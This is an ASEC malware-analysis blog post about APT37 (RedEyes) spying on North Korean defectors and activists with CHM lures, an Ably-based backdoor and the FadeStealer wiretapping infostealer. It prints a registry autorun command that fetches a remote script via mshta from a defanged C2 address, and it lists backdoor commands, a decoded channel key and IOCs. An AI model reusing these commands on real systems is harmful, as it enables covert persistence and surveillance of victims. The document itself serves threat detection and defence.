# Reference for threat actor for "Reaper, APT 37, Ricochet Chollima, ScarCruft"

**Title**: RedEyes Group Wiretapping Individuals (APT37) - ASEC BLOG

**Source**: https://asec.ahnlab.com/en/54349/

## Content















RedEyes Group Wiretapping Individuals (APT37) - ASEC BLOG



































































 

Malware Information
AhnLab Detection
Statistics
Response Guide
AhnLab
 














Posted By muhan  , June 21, 2023 

RedEyes Group Wiretapping Individuals (APT37) 
1. Overview
RedEyes (also known as APT37, ScarCruft, and Reaper) is a state-sponsored APT group that mainly carries out attacks against individuals such as North Korean defectors, human rights activists, and university professors. Their task is known to be monitoring the lives of specific individuals. In May 2023, AhnLab Security Emergency response Center (ASEC) discovered the RedEyes group distributing and using an Infostealer with wiretapping features that was previously unknown along with a backdoor developed using GoLang that exploits the Ably platform.* ABLY [1] is a platform for real-time data transfer and messaging. It can also perform publish/subscribe messaging, push notifications, real-time query, and state synchronization.
The threat actor sent their commands through the GoLang backdoor that is using the Ably service. The API key value required for command communication was saved in a GitHub repository. This API key value is necessary for communicating with the threat actor’s channel, so anyone is capable of subscribing if they know this key value. Due to this, some of the commands used by the threat actor at the time of analysis could be identified.
ASEC aims to share the tactics, techniques, and procedures (TTPs) utilized by the RedEyes group during their attacks in May 2023. From the initial breach technique, all the way to privilege escalation, command and control, and exfiltration, each stage used by the RedEyes group to monitor individuals will be covered in this blog post.

Figure 1. RedEyes attack flow
2. Analysis
2.1. Initial Access
The threat actor used a CHM (Compiled HTML Help File) file to carry out their initial breach. Similar to the case covered back in March, “Malware Distributed Disguised as a Password File” [2], it is assumed that targets were approached via spear phishing emails with a normal password-protected document and a CHM malware disguised as a password file attached to them. In other words, by compressing a normal password-protected document with CHM malware, the threat actor led users into believing that the CHM file must be executed in order to view the password-protected document.

Figure 2. Bait document and malicious CHM file
When a user executes the CHM file, they can see the password information as shown in Figure 3. However, the internal script code in the CHM shown in Figure 4 triggers MSHTA.exe to be executed, which causes a malicious script from the threat actor’s C&C server to be executed as well.

Figure 3. Content of CHM file

Figure 4. Script code within CHM
The malicious script obtained during the analysis was confirmed as PowerShell malware that maintains persistence through the use of an autorun registry key. It also possesses a backdoor feature.

Figure 5. PowerShell script (backdoor) downloaded from threat actor’s server
The PowerShell malware confirmed back in the February 2023 post, “HWP Malware Using the Steganography Technique” [3], had relatively simple features. It involved executing the threat actor’s commands and sending the results using CMD.exe, as well as registering to the RUN key registry for persistence. Although the recently obtained PowerShell malware still employs the same registry key registration for persistence, it does not use CMD.exe and instead performs different behaviors according to the C&C server command. The features are shown below in Table 1.
CommandFeaturefileinfoSends the file list and information (name, size, modified time) in a specific path saved as a CSV to the C&C server and deletes the csvdirCompresses folders in a specific path and sends the compressed file to the C&C server before deleting the filefileUploads a specific file to the C&C serverdownDownloads files to a specific pathregeditFeature to edit registrytaskFeature to register to task scheduler so it is executed repeatedly at 10 min intervalszipFeature to uncompress files in a specific pathrenameFeature to change the name of a specific filedelFeature to delete files in a specific pathTable 1. PowerShell backdoor features
2.2. Persistence
The malicious PowerShell script that is executed by MSHTA.exe uses the command below to register itself on the autorun registry key, allowing malicious scripts to be executed from the threat actor’s C&C server even after system reboots.

New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name kcJuWlrQO -Value ‘c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 569782 2.2.2.2 || mshta hxxp://172.93.181[.]249/control/html/1.html’ -PropertyType String -Force;

2.3. Command and Control
The threat actor carried out later attack stages such as privilege escalation, exfiltration, and malware distribution through a backdoor that utilizes the Ably platform service which is based on GoLang. The Ably platform is capable of transferring data in real-time, and anyone with a channel authentication key can access the channel to receive messages. During the analysis, ASEC managed to secure the authentication key of the threat actor’s channel and view some of the commands that were sent to targets.
Time of TransmissionExecuted Command2023-05-09 10:16:16forfiles /p c:\programdata2023-05-09 10:49:47ren c:\programdata\wallpaper-river.jpg wallpaper-river.exe2023-05-09 10:49:53forfiles /p c:\programdata2023-05-09 10:50:09wmic OS get Caption,CSDVersion,OSArchitecture,Version2023-05-09 10:50:35c:\programdata\wallpaper-river.exeTable 2. Commands executed through AblyGo backdoor
The RedEyes group using Ably to send commands has been reported before by KISA [4] and Sekoia [5]. The Ably-based GoLang backdoor found at the time had the authentication key within its binary, as shown in Figure 6, but the backdoor obtained in this instance saved the authentication key in a GitHub repository, allowing for the authentication key to be received dynamically for channel communication. This was most likely done so that the Ably channel authentication key could be changed frequently and to prevent third parties from reading the channel messages.

Figure 6. Hard-coded authentication key information (previous AblyGo backdoor)

Figure 7. Feature to lookup authentication key using GitHub (AblyGo backdoor variant)(GitHub URL: https://raw.githubusercontent.com/thanks023/hello/main/ReadMe.txt)
The GoLang backdoor accesses the GitHub URL that exists within its binary and retrieves the data that is in the “<>BASE64-encoded channel authentication key” format in order to obtain the Ably channel authentication key. This method can also be seen in Figure 4 of “The Unintentional Leak: A glimpse into the attack vectors of APT37” [6] that was published by zscaler back in March 2023. According to this post, the threat actor frequently committed strings encoded in BASE64. Decrypting the string shown in Figure 4 results in the Ably authentication key value.
[GitHub Commit String]<>S3dITXZ3LmJvaUMzdzpqR2JmMDd3VW9iN3RGanoxM1dxRFE4WJRsVFBDbVBQdldzb3hZYjFxc21r[GitHub Decrypted String]<>KwHMvw.boiC3w:jGbf07wUob7tFjz13WqDQ8X.lTPCmPPvWsoxYb1qsmk (Ably authentication key)
If the AblyGo backdoor is executed on an infected system, the “<>authentication key” is retrieved from GitHub. It then parses “<>” with the code part of Figure 7 before decoding the string that follows with BASE64. The threat actor’s Ably channel is then accessed via the decoded authentication key value where messages named “UP” and “DOWN” are transmitted and received. The format and features of the transmitted and received data are shown below in Table 3.
Message Name (Feature)Data FormatUP (Sends HELLO and uploads command result){“Id”:”PC Name”,”Textdata”:”SEVMTw==”}DOWN (Transmits CMD command){“Id”:”PC Name”,”Textdata”:”SEVMTw==”}Table 3. Format and features of AblyGo backdoor’s transmitted and received messages
After AblyGo is executed on an infected PC, it sends the “HELLO” data encoded in BASE64 at an interval of about 2 to 5 minutes to signify that the PC is connected with the threat actor’s Ably channel (Message name: UP).
The threat actor monitors the Ably channel and identifies the ID of the infected PC. They then encode the command in BASE64 and transmit it again (Message name: DOWN).
The execution of commands received from the C&C server is performed exclusively through CMD.exe, and the results of the CMD commands are transmitted back to the channel using the “UP” message. In other words, “UP” serves as a message for the threat actor to identify the infected PC and receive command results, while “DOWN” is used as a message for issuing commands.
2.4. Privilege Escalation
After command and control, the threat actor uses a known privilege escalation technique called T1546.015 (Event Triggered Execution: Component Object Model Hijacking) to execute additional malware. The malware registered to the registry key in Figure 8 could not be secured.

Figure 8. Privilege escalation technique (T1546.015)
2.5. Exfiltration
The threat actor utilizes the AblyGo backdoor and MSTHA PowerShell to ultimately execute an Infostealer in a fileless form.

Figure 9. FadeStealer execution flow

Figure 10. Detection screen (Process tree structure) of AhnLab Endpoint Detection Response (EDR)
The executed Infostealer has various features, such as taking screenshots, exfiltrating data from removable media devices & smartphones, keylogging, and wiretapping.

Figure 11. Wiretapping feature added to FadeStealer
Based on the characteristic of the folder name where the exfiltrated data is stored, ASEC has named this newly discovered malware as FadeStealer (Fade as a stealer). FadeStealer creates individual folders for each exfiltrated data in the %temp% directory. It utilizes an integrated RAR compression utility within the file to compress the exfiltrated data from the infected PC at 30-minute intervals using a password. FadeStealer has a meticulous side to it as it employs the split compression feature, limiting each volume to a maximum of 1 GB if the compressed file ever exceeds 1 GB.
Folder PathExfiltrated Data%temp%\VSTelems_Fade\NgenPdbcScreenshots%temp%\VSTelems_Fade\NgenPdbkKeylogging%temp%\VSTelems_Fade\NgenPdbmMicrophone wiretapping%temp%\VSTelems_FadeInData collection of smartphone device%temp%\VSTelems_FadeOutRemovable media deviceTable 4. Folder paths and exfiltrated data

Figure 12. Detection screen of AhnLab EDR (Information theft using RAR compression utility)
Compression OptionFeature ExplanationaAdd compressed filerRecover compressed fileep1Remove base directory from namem0Set compression level (save)yAutomatically answer yes to all questionsp NaeMhq[d]qSet compression password as NaeMhq[d]qv1gSet compression volume limit to 1 GBTable 5. Compression options

Figure 13. Stolen personal information found on the threat actor’s server
3. Conclusion
The RedEyes group carries out attacks against specific individuals such as North Korean defectors, human rights activists, and university professors. Their primary focus is on information theft, and an Infostealer with a feature to wiretap microphones was discovered in this recent attack case. Unauthorized eavesdropping on individuals in South Korea is considered a violation of privacy and is strictly regulated under relevant laws. Despite this, the threat actor monitored everything victims did on their PC and even conducted wiretapping.
If you examine the overall attack flow in this case, the threat actor carried out their attack cleverly and precisely by employing spear phishing emails to gain access to target systems and using an Ably channel as a command-and-control server. These sorts of attacks are difficult for individuals to notice. As such, ASEC is closely tracking the activities of the RedEyes group and responding promptly to prevent further damage.
Users must refrain from opening files from unknown sources to prevent themselves from being harmed. Especially now since the group in question has recently been using malware based on CHM and LNK extensions to perform their initial breach, extra attention should be given to the file extensions when executing email attachments. The file extension is set to hidden by default, so it is recommended to refer to Figure 14 and uncheck the “Hide extensions for known file types”. If the attached files are CHM or LNK, then it is crucial that you verify the source of the email before executing them.

Figure 14. Uncheck “Hide extensions for known file types”
4. Reference
[1] Ably[2] Malware Distributed Disguised as a Password File[3] HWP Malware Using the Steganography Technique: RedEyes (ScarCruft)[4] TTPs $ ScarCruft Tracking Note – KISA[5] Peeking at Reaper’s surveillance operations – sekoia[6] The Unintentional Leak: A glimpse into the attack vectors of APT37 – zscaler
[IOC][MD5][CHM]1352abf9de97a0faf8645547211c3be7[Powershell Backdoor]1c1136c12d0535f4b90e32aa36070682[AblyGo Variant]msedgeupdate.ini (3277e0232ed6715f2bae526686232e06)msedgeupdate.ini (3c475d80f5f6272234da821cc418a6f7)[Dll Sideloading – Loader]mfc42u.dll (59804449f5670b4b9b3b13efdb296abb)[FadeStealer]DESKTOP.lNl (f44bf949abead4af0966436168610bcc)
[File Detection]Trojan/Win.Goably.C5436296 (2023.06.03.00)Trojan/Win.Goably.C5422375 (2023.05.09.02)Trojan/Win.Loader.C5424444 (2023.05.09.02)Data/BIN.RedEyes (2023.06.08.01)Downloader/CHM.Generic (2023.06.02.03)Downloader/PowerShell.Generic (2023.06.06.00)
[Behavior Detection]Injection/EDR.Event .M11124
[Exfiltrated Data Save URL]hxxp://172.93.181[.]249/control/data/[AblyGo Backdoor Upload Path]hxxp://172.93.181[.]249/file/[PowerShell Backdoor Download URL After Initial Breach Stage]hxxp://172.93.181[.]249/control/html/1.html
AhnLab EDR protects the endpoint environment by delivering behavioral detection, advanced analysis, holistic visibility, and proactive threat hunting. For more information about the product, please visit our official website.

 

Categories:Malware Information 
Tagged as:APT37,Reaper,RedEyes,ScarCruft 




Kimsuky Distributing CHM Malware Under Various Subjects 

Malware Disguised as HWP Document File (Kimsuky) 







5
5
votes
Article Rating

 





 Subscribe




 Login 




Notify of 


new follow-up comments
new replies to my comments








 







 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 










 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 






78 Comments                    









 Inline Feedbacks                    
View all comments











ScarCruft Hackers Exploit Ably Service for Stealthy Wiretapping Attacks – PC Repair Hub



    7 months ago













[…] that is using the Ably service,” the AhnLab Security Emergency response Center (ASEC) said in a technical report. “The API key value required for command communication was saved in a […]






0






Reply













North Korean Hackers Caught Using Malware With Microphone Wiretapping Capabilities – Cyber Social Hub



    7 months ago













[…] based in South Korea, said it discovered the latest attacks in May 2023 and warned that the hackers are using a CHM (Compiled HTML Help File) payload disguised […]






0






Reply













RedEyes Group Targets Individuals with Wiretapping Malware - Infosecurity Magazine



    7 months ago













[…] was discovered by AhnLab Security Emergency Response Center (ASEC), which described it in an advisory published on […]






0






Reply













RedEyes APT Group Attacking Individuals to Exfiltrate Sensitive Data – ZBM Security News



    7 months ago













[…] By acquiring the Ably API key used by the backdoor, ASEC managed to monitor specific commands that the threat actors execute, Researchers said. […]






0






Reply













APT37 hackers deploy new FadeStealer eavesdropping malware | Cyber Review



    7 months ago













[…] a new report from the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new […]






0






Reply













FadeStealer Malware Removal — How To Fix Guide



    7 months ago













[…] to ASEC, the phishing emails employ tactics to entice individuals into opening the CHM file in order to […]






0






Reply













North Korean APT37 Exploits New FadeStealer Malware – Source: heimdalsecurity.com – CISO2CISO.COM & CYBER SECURITY GROUP



    7 months ago













[…] recent report from the AhnLab Security Emergency Response Center (ASEC) sheds light on the group’s latest […]






0






Reply













ScarCruft Hackers Exploit Ably Service for Stealthy Wiretapping Attacks - The Cyberweb



    7 months ago













[…] that is using the Ably service,” the AhnLab Security Emergency response Center (ASEC) said in a technical report. “The API key value required for command communication was saved in a […]






0






Reply













North Korea Hacker: APT37 hackers deploy new FadeStealer eavesdropping malware - Cyber Info Tech ITJD



    7 months ago













[…] a new report from the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new […]






0






Reply













RedEyes Group Targets Individuals with Wiretapping Malware – Source: www.infosecurity-magazine.com – CISO2CISO.COM & CYBER SECURITY GROUP



    7 months ago













[…] was discovered by AhnLab Security Emergency Response Center (ASEC), which described it in an advisory published on […]






0






Reply













North Korean APT Targets Defectors, Activists With Infostealer Malware - ThreatsHub Cybersecurity News



    7 months ago













[…] a blog post June 21, the AhnLab Security Emergency Response Center (ASEC) reported that the infostealer had wiretapping […]






0






Reply













RedEyes Group Targets Individuals with Wiretapping Malware – Unified Networking



    7 months ago













[…] was discovered by AhnLab Security Emergency Response Center (ASEC), which described it in an advisory published on […]






0






Reply













ScarCruft Hackers Exploit Ably Service for Stealthy Wiretapping Attacks - The Network Company | Cyber Security | IT Services | Network Security



    7 months ago













[…] that is using the Ably service,” the AhnLab Security Emergency response Center (ASEC) said in a technical report. “The API key value required for command communication was saved in a […]






0






Reply













APT37 Found Using FadeStealer to Eavesdrop on Victims | Cyware Alerts - The Cyberweb



    7 months ago













[…] to ASEC researchers, FadeStealer was first spotted in May and was observed being distributed along with a Golang-based backdoor that exploits the Ably […]






0






Reply













North Korean Hackers Caught Using Malware With Microphone Wiretapping Capabilities – Source: www.securityweek.com – CISO2CISO.COM & CYBER SECURITY GROUP



    7 months ago













[…] based in South Korea, said it discovered the latest attacks in May 2023 and warned that the hackers are using a CHM (Compiled HTML Help File) payload disguised […]






0






Reply













LES HACKERS DE SCARCRUFT DÉPLOIENT UN LOGICIEL MALVEILLANT DE VOL D'INFORMATIONS DOTÉ DE FONCTIONS D'ÉCOUTE ÉLECTRONIQUE - Blog KoDDoS



    7 months ago













[…] campagne de piratage a été révélée dans un rapport technique publié par l’AhnLab Security Emergency Response Center (ASEC). Le rapport indique que […]






0






Reply













Hackers norte-coreanos são pegos usando malware com recursos de escuta telefônica de microfone



    7 months ago













[…] AhnLab, com sede na Coreia do Sul, disse que descobriu os últimos ataques em maio de 2023 e alertou que os hackers estão usando uma carga CHM (Compiled HTML Help File) […]






0






Reply













IT Security Weekend Catch Up – June 24, 2023 – BadCyber



    7 months ago













[…] RedEyes group wiretapping individuals (APT37) […]






0






Reply













June 24, 2023 - Red-N Security



    7 months ago













[…] RedEyes Group Wiretapping Individuals (APT37) […]






0






Reply













Weekendowa Lektura: odcinek 525 [2023-06-24]. Bierzcie i czytajcie | Zaufana Trzecia Strona



    7 months ago













[…] Taktyki, techniki i procedury używane przez grupę RedEyes (APT37) […]






0






Reply













North Korean APT37 Exploits New FadeStealer Malware - Cyber Security Blogs



    7 months ago













[…] recent report from the AhnLab Security Emergency Response Center (ASEC) sheds light on the group’s latest […]






0






Reply













ScarCruft Hackers Exploit Ably Service for Stealthy Wiretapping Attacks - SPIXNET C2S



    7 months ago













[…] that is using the Ably service,” the AhnLab Security Emergency response Center (ASEC) said in a technical report. “The API key value required for command communication was saved in a […]






0






Reply













APT37 hackers deploy new FadeStealer eavesdropping malware - SPIXNET C2S



    7 months ago













[…] a new report from the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new […]






0






Reply













North Korean APT Targets Defectors, Activists With Infostealer Malware. Hackers News | Hackers News



    7 months ago













[…] a blog post June 21, the AhnLab Security Emergency Response Center (ASEC) reported that the infostealer had wiretapping […]






0






Reply













Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) - ASEC BLOG



    5 months ago













[…] The additional script codes (hxxp://bian0151.cafe24.com/admin/board/1.html) executed through mshta contain a PowerShell command obfuscated in Base64 as shown below. This command performs functions similar to those previously disclosed in Table 1 of the post <RedEyes Group Wiretapping Individuals (APT37)> [3]. […]






0






Reply













Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) – F1TYM1



    5 months ago













[…] The additional script codes (hxxp://bian0151.cafe24.com/admin/board/1.html) executed through mshta contain a PowerShell command obfuscated in Base64 as shown below. This command performs functions similar to those previously disclosed in Table 1 of the post <RedEyes Group Wiretapping Individuals (APT37)> [3]. […]






0






Reply













BlueShell Used in APT Attacks Against Korean and Thai Targets - ASEC BLOG



    5 months ago













[…] Meterpreter, [3] the RedEyes (APT37) threat group developed a backdoor by abusing the Ably service, [4] and the Andariel threat group developed a variety of malware including 1th Troy reverse shell, […]






0






Reply













atozvodka



    1 month ago













the best vodka brands






0






Reply




 
« Previous
1
2 












Archives Archives

Select Month
 February 2024 
 January 2024 
 December 2023 
 November 2023 
 October 2023 
 September 2023 
 August 2023 
 July 2023 
 June 2023 
 May 2023 
 April 2023 
 March 2023 
 February 2023 
 January 2023 
 December 2022 
 November 2022 
 October 2022 
 September 2022 
 August 2022 
 July 2022 
 June 2022 
 May 2022 
 April 2022 
 March 2022 
 February 2022 
 January 2022 
 December 2021 
 November 2021 
 October 2021 
 September 2021 
 August 2021 
 July 2021 
 June 2021 
 May 2021 
 April 2021 
 March 2021 
 February 2021 
 January 2021 
 December 2020 
 November 2020 
 September 2020 
 August 2020 
 July 2020 
 June 2020 
 May 2020 
 April 2020 
 March 2020 
 February 2020 
 December 2019 
 November 2019 
 October 2019 
 September 2019 
 August 2019 
 June 2019 
 May 2019 
 April 2019 
 March 2019 
 February 2019 
 January 2019 
 November 2018 
 July 2018 
 April 2018 
 February 2018 


FOLLOW US


LinkedIn   


X   


RSS Feed   









footer(en) 220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Korea | Privacy & Security© AhnLab, Inc. All rights reserved.family site


한국 (한국어)
Global (English)
日本 (日本語)
 




wpDiscuzInsert 









 




















































































Loading Comments...



 


Write a Comment...




Email



Name



Website
















































































































































































































































